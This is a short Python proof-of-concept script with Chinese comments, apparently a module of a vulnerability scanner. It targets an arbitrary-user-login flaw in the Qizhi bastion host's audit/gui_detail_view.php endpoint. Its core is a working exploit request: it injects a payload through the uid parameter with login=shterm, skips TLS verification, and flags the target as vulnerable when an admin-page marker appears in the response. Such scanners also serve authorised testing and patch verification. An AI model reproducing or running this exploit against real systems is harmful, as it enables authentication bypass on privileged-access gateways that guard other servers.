'''
齐治堡垒机 gui_detail_view.php 任意用户登录漏洞
'''
import requests

import main
from main import hprint, print_blue


def qzbl_anylogin(url, timeout=6):
    poc_name = '齐治堡垒机任意用户登录'
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    if url[-1] == '/':
        url = url[0:len(url) - 1]
    try:
        re = requests.get(url + '/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm', timeout=timeout,verify=False)
        # print(re)
        if 'nav_sys_message' in re.text:
            main.print_green(f'{poc_name} ====> 存在漏洞 ====> {url}')
            return
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)